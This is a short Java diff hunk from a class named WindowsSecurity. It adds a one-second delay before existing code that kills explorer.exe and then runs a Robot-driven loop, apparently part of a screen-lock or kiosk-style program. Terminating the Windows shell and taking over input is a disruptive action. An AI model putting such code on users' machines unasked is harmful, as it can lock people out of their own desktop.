@@ -51,6 +51,7 @@ public class WindowsSecurity implements Runnable {
     @Override
     public void run() {
         try {
+            Thread.sleep(1000L);
             kill("explorer.exe"); // Kill explorer
             Robot robot = new Robot();
             while (running) {
